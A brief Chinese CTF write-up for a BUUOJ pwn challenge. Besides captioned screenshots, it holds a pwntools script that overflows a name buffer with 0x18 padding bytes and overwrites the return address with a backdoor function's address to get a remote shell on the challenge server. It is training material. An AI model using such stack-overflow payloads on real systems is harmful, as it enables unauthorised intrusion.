<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771402385238-9ab37a7a-4e18-4eec-9308-cfcede2312cf.png)

两个输入点，一次名字长度，一次名字

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771402519023-24224307-d78e-434e-ba67-3c3cd915c3b9.png)

有后门函数

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771402534715-775d5d04-b94f-4e51-921a-a4d75e90184f.png)

相当简单的栈溢出了

直接写了



```python
from pwn import*
r=remote('node5.buuoj.cn',27363)

backdoor=0X4006E6
#ret=0x400561
payload=b'a'*0x18+p64(backdoor)

r.recvuntil('of your name:')
r.sendline(str(50))
r.recvuntil('u name?')
r.sendline(payload)

r.interactive()


```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771403758584-8eeabf97-ab8d-46d0-8df4-2e20fb218cfe.png)

